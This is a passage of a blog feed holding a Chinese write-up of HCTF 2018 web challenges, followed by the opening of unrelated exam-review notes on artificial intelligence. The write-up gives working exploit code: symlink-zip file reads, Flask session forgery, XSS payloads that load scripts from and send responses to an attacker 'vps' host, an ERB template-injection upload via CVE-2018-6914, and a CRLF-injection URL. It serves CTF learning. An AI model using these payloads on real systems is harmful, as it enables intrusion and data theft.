class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>拿到题目，读一下cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImV3Z3RyIn0.DskYKw.8F8fj0a4sT0l8sD2-widlj9pN8U</span><br></pre></td></tr></table></figure></p><p>解码<br><img src="/images/2018-11-11-09-38-34.png" alt=""><br>思路很清晰，伪造admin即可<br>然后发现软连接可用来任意文件读取，那么想到读取secret_key<br>读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 1.txt</span><br><span class="line">zip -y 1.zip 1.txt</span><br></pre></td></tr></table></figure></p><p>得到内容<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p><p>关键语句<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure></p><p>但是SECRET_KEY是随机数，需要预测，那么需要py版本号<br>在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /app/main.py 1.txt</span><br><span class="line">zip -y 1.zip 1.txt</span><br></pre></td></tr></table></figure></p><p>发现内容<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World from Flask in a uWSGI Nginx Docker container with \</span></span><br><span class="line"><span class="string">     Python 3.6 (default)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="keyword">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></p><p>发现python是3.6版本的，那么即可尝试预测随机数<br>对于<code>uuid.getnode()</code><br>尝试读取<code>/sys/class/net/eth0/address</code><br>得到<code>12:34:3e:14:7c:62</code><br>计算十进制：20015589129314<br>用python3.6去看一下随机数<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(<span class="number">20015589129314</span>)</span><br><span class="line"><span class="keyword">print</span> str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-11-10-03-48.png" alt=""><br>得到secret_key=11.935137566861131<br>尝试伪造session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk</span><br></pre></td></tr></table></figure></p><p>得到flag<br><img src="/images/2018-11-11-10-04-47.png" alt=""></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>这题贼无聊。。。order by password就行，然后一直注册fuzz<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">    sha = hashlib.md5(str)</span><br><span class="line">    encrypts = sha.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> encrypts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    url = <span class="string">'http://game.2018.hctf.io/web2/action.php?action=reg'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>:username,</span><br><span class="line">        <span class="string">"password"</span>:password,</span><br><span class="line">        <span class="string">"sex"</span>:<span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">        password = <span class="string">'dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja'</span>+chr(i)</span><br><span class="line">        username=md5(password)</span><br><span class="line">        content = username + <span class="string">" "</span> + password +<span class="string">" "</span>+ str(i) + <span class="string">"\n"</span></span><br><span class="line">        reg(username, password)</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">    <span class="keyword">print</span> str(start)+<span class="string">'~'</span>+str(end)+<span class="string">"complete"</span></span><br><span class="line"></span><br><span class="line">step=<span class="number">20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>,step):</span><br><span class="line">    t = threading.Thread(target=fuzz, args=(i, i+step))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure></p><p>一位一位得到密码<code>dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja</code><br>登录admin，即可<br><img src="/images/2018-11-11-16-25-25.png" alt=""></p><h2 id="share-队友完成"><a href="#share-队友完成" class="headerlink" title="share(队友完成)"></a>share(队友完成)</h2><p>在<code>http://share.2018.hctf.io/home/Alphatest</code>里看到我们的uid和当前file number。<br>在<code>http://share.2018.hctf.io/home/share</code>存在xss。<br>content填入xss代码:<code>&lt;img src=s onerror=&#39;var p=document.createElement(&quot;script&quot;);p.src=&quot;https://vps&quot;;document.body.appendChild(p);&#39;&gt;</code>Download url随便填。<br>读取后台web页面，可以看到主要能用到的有<code>addtest</code>和<code>upload</code>。其中<code>addtest</code>提交到<code>/file/Alpha_test</code>,<code>upload</code>提交到<code>/file/upload</code>。<br>这两个的代码在tobots.txt中都有。这两个url都做了限定只有admin才能提交。<br>因此我们需要利用xss上传我们的文件。读取源码可以知道这是ruby on rails。我们可以上传erb模板文件。<br>在源码中使用了<code>Tempfile.new(name.split(&#39;.&#39;+ext)[0],Rails.root.to_s+&quot;/public/upload&quot;)</code><br>队友找到<a href="https://www.ruby-lang.org/zh_cn/news/2018/03/28/unintentional-file-and-directory-creation-with-directory-traversal-cve-2018-6914/" target="_blank" rel="noopener">cve 2018-6914</a>(ruby2.5.0的hint，我本地版本不对卡了好久。。。。）<br>参考：<code>https://hackerone.com/reports/302298</code>，我们可以构造文件名为<code>/../../app/views/home/aa38.erb</code>，文件内容:<code>&lt;%= `cat /flag ` %&gt;</code>,在这里文件名和文件内容都需要base64编码一次。<br>上传文件js payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">"http://share.2018.hctf.io/home/upload"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> token=data.substr(data.indexOf(<span class="string">'name="authenticity_token" value="'</span>)+<span class="number">33</span>,<span class="number">88</span>);</span><br><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">"authenticity_token"</span>, token);</span><br><span class="line">formData.append(<span class="string">"file[context]"</span>, <span class="string">"zxcvxzcvxzcv"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> content = <span class="string">'PCU9IGBjYXQgL2ZsYWcgYCAlPg=='</span>;   <span class="comment">//这是文件内容的base64</span></span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([content], &#123; <span class="attr">type</span>: <span class="string">"image/png"</span>&#125;);</span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">"file[myfile]"</span>, blob,<span class="string">"Ly4uLy4uL2FwcC92aWV3cy9ob21lL2FhMzguZXJi"</span>);  <span class="comment">//这里是文件名的base64</span></span><br><span class="line">formData.append(<span class="string">"commit"</span>, <span class="string">'submit'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"http://share.2018.hctf.io/file/upload"</span>);</span><br><span class="line">request.send(formData);</span><br><span class="line">request.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (request.readyState==<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">$.ajax(&#123;<span class="attr">url</span>:<span class="string">'http://vps/'</span>,<span class="attr">type</span>:<span class="string">'POST'</span>,<span class="attr">data</span>:&#123;<span class="string">'request_respone'</span>:request.response,<span class="string">'request_status'</span>:request.status&#125;,<span class="attr">dataType</span>:<span class="string">'jsonp'</span>,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;&#125;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>上传之后我们的erb模板就已经躺在home目录下面了。但是需要通过管理员分享给自己才能拿到文件名。<br>文件分享payload:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">"http://share.2018.hctf.io/home/addtest"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> token=data.substr(data.indexOf(<span class="string">'name="authenticity_token" value="'</span>)+<span class="number">33</span>,<span class="number">88</span>);</span><br><span class="line">$.ajax(&#123;<span class="attr">url</span>:<span class="string">'http://share.2018.hctf.io/file/Alpha_test'</span>,<span class="attr">type</span>:<span class="string">'POST'</span>,<span class="attr">data</span>:&#123;<span class="string">'token'</span>:token,<span class="string">'uid'</span>:<span class="string">'3'</span>,<span class="string">'fid'</span>:<span class="string">'23'</span>,<span class="string">'commit'</span>:<span class="string">'submit'</span>&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">$.get(<span class="string">"http://vps/?set=aaa"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">b</span>)</span>&#123;&#125;);</span><br><span class="line">&#125;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这里的fid就是当前文件个数。最后一个上传的文件就是我们的文件。<br>然后查看home/Alphatest，就能拿到文件名。<br>最后访问<code>http://share.2018.hctf.io/?page=aa3820181111-336-12y58wh</code>获取flag。</p><h2 id="bottle-队友完成"><a href="#bottle-队友完成" class="headerlink" title="bottle(队友完成)"></a>bottle(队友完成)</h2><p>登录进去发现有个path的302跳转，猜测这里有xss，试了一下不行，根据提示得到firefoxdriver，猜测有crlf，结合Transfer-Encoding<br>chunked头，尝试了一下post请求，这里要加content-length和xss-proction就可以弹回来了，然后就是替换bot的cookie,payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src%3dhttp://139.199.27.197:7000/1.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Warmup&quot;&gt;&lt;a href=&quot;#Warmup&quot; class=&quot;headerlink&quot; title=&quot;Warmup&quot;&gt;&lt;/a&gt;Warmup&lt;/h2&gt;&lt;p&gt;打开题目，f12发现&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Artificial Intelligence Review</title>
    <link href="http://skysec.top/2018/11/12/Artificial-Intelligence-Review/"/>
    <id>http://skysec.top/2018/11/12/Artificial-Intelligence-Review/</id>
    <published>2018-11-12T02:52:57.000Z</published>
    <updated>2018-11-19T01:35:49.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>纯为了考试复习而生的文章<br>考试内容：</p><ul><li>单选20%</li><li>判断10%</li><li>简答20%</li><li>计算与证明50%</li></ul><p>作业题：<br>第二章：1，2，3，4，5，6<br>第三章：1，3，4，5，6，12<br><img src="/images/2018-11-12-11-43-05.png" alt=""><br><img src="/images/2018-11-12-11-43-30.png" alt=""><br><img src="/images/2018-11-12-11-44-06.png" alt=""><br>第五章：1，2，3，5，7，8，9，10，11，12</p><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="人工智能的定义"><a href="#人工智能的定义" class="headerlink" title="人工智能的定义"></a>人工智能的定义</h3><ul><li>人工智能是制造能够完成需要人的智能才能完成的任务的机器的技术</li><li>人工智能是研究如何让计算机做现阶段人类才能做得更好的事情</li><li>人工智能是一种使计算机能够思维、使机器具有智力的激动人心的新尝试</li><li>人工智能是那些与人的思维、决策、问题求解和学习等有关活动的自动化</li><li>人工智能是用计算模型对智力行为进行的研究</li><li>人工智能是研究那些使理解、推理和行为成为可能的计算</li><li>人工智能是一门通过计算过程力图解释和模仿智能行为的学科</li><li>人工智能是计算机科学中与智能行为的自动化有关的一个分支</li></ul><h3 id="人工智能研究各个发展阶段"><a href="#人工智能研究各个发展阶段" class="headerlink" title="人工智能研究各个发展阶段"></a>人工智能研究各个发展阶段</h3><p>1.孕育期（1956年以前）<br>2.行成及第一个兴旺期（1956~1966）<br>3.萧条波折期（1967~70年代中期）<br>4.第二个兴旺期（20世纪70年代中期~80年代中期）<br>5.稳步增长期（20世纪80年代中期~至今）</p><h3 id="人工智能研究特点"><a href="#人工智能研究特点" class="headerlink" title="人工智能研究特点"></a>人工智能研究特点</h3><ul><li>人工智能是一门知识的学科</li><li>数据处理 -&gt; 知识处理 ，数据 -&gt; 符号</li><li>有启发，有推导</li><li>人工智能是引起争论最多的科学之一</li><li>人工智能研究是非常困难的</li></ul><h3 id="人工智能的三大学派"><a href="#人工智能的三大学派" class="headerlink" title="人工智能的三大学派"></a>人工智能的三大学派</h3><ul><li>符号主义：逻辑主义、心理学派、计算机学派、物理符号系统</li><li>连接主义：神经网络、仿生学派、生理学派</li><li>行为主义：控制论及感知、进化主义、控制论学派</li></ul><h3 id="图灵测试"><a href="#图灵测试" class="headerlink" title="图灵测试"></a>图灵测试</h3><p>测试机器，如果我们无法区别出机器和人，那么根据图灵的理论，就可以认为这个机器是智能的</p><h3 id="人工智能研究的主要应用领域"><a href="#人工智能研究的主要应用领域" class="headerlink" title="人工智能研究的主要应用领域"></a>人工智能研究的主要应用领域</h3><p><img src="/images/2018-11-12-11-19-05.png" alt=""></p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="命题逻辑语法"><a href="#命题逻辑语法" class="headerlink" title="命题逻辑语法"></a>命题逻辑语法</h3><p><img src="/images/2018-11-12-11-21-18.png" alt=""><br><img src="/images/2018-11-12-11-21-26.png" alt=""><br><img src="/images/2018-11-12-11-21-53.png" alt=""></p><h3 id="谓词逻辑"><a href="#谓词逻辑" class="headerlink" title="谓词逻辑"></a>谓词逻辑</h3><h4 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h4><p><img src="/images/2018-11-12-11-23-57.png" alt=""><img src="/images/2018-11-12-11-24-07.png" alt=""></p><h4 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h4><p><img src="/images/2018-11-12-11-25-52.png" alt=""></p><h4 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h4><p><img src="/images/2018-11-12-11-27-16.png" alt=""><br><img src="/images/2018-11-12-11-27-27.png" alt=""><br><img src="/images/2018-11-12-11-27-34.png" alt=""><br><img src="/images/2018-11-12-11-28-59.png" alt=""></p><h3 id="语义网络"><a href="#语义网络" class="headerlink" title="语义网络"></a>语义网络</h3><h4 id="类属关系"><a href="#类属关系" class="headerlink" title="类属关系"></a>类属关系</h4><p><img src="/images/2018-11-14-11-04-48.png" alt=""></p><h4 id="包含关系"><a href="#包含关系" class="headerlink" title="包含关系"></a>包含关系</h4><ul><li>Part-of</li><li>Member-of<br><img src="/images/2018-11-14-11-06-03.png" alt=""><h4 id="属性关系"><a href="#属性关系" class="headerlink" title="属性关系"></a>属性关系</h4><img src="/images/2018-11-14-11-06-23.png" alt=""><br><img src="/images/2018-11-14-11-06-29.png" alt=""><h4 id="时间关系"><a href="#时间关系" class="headerlink" title="时间关系"></a>时间关系</h4><img src="/images/2018-11-14-11-06-43.png" alt=""><br><img src="/images/2018-11-14-11-06-48.png" alt=""><h4 id="位置关系"><a href="#位置关系" class="headerlink" title="位置关系"></a>位置关系</h4><img src="/images/2018-11-14-11-07-02.png" alt=""><br><img src="/images/2018-11-14-11-07-12.png" alt=""><h4 id="相似关系"><a href="#相似关系" class="headerlink" title="相似关系"></a>相似关系</h4><img src="/images/2018-11-14-11-07-34.png" alt=""><br><img src="/images/2018-11-14-11-07-43.png" alt=""><h4 id="因果关系"><a href="#因果关系" class="headerlink" title="因果关系"></a>因果关系</h4>如果…..那么……<br><img src="/images/2018-11-14-11-08-17.png" alt=""><h4 id="组成关系"><a href="#组成关系" class="headerlink" title="组成关系"></a>组成关系</h4><img src="/images/2018-11-14-11-08-39.png" alt=""></li></ul><h4 id="例题1-1"><a href="#例题1-1" class="headerlink" title="例题1"></a>例题1</h4><p><img src="/images/2018-11-14-11-12-03.png" alt=""></p><h4 id="例题2-1"><a href="#例题2-1" class="headerlink" title="例题2"></a>例题2</h4><p><img src="/images/2018-11-14-11-12-45.png" alt=""></p><h4 id="例题3-1"><a href="#例题3-1" class="headerlink" title="例题3"></a>例题3</h4><p><img src="/images/2018-11-14-11-13-11.png" alt=""></p><h4 id="例题4"><a href="#例题4" class="headerlink" title="例题4"></a>例题4</h4><p><img src="/images/2018-11-14-11-13-59.png" alt=""></p><h4 id="例题5"><a href="#例题5" class="headerlink" title="例题5"></a>例题5</h4><p><img src="/images/2018-11-14-11-18-32.png" alt=""></p><h4 id="例题6"><a href="#例题6" class="headerlink" title="例题6"></a>例题6</h4><p><img 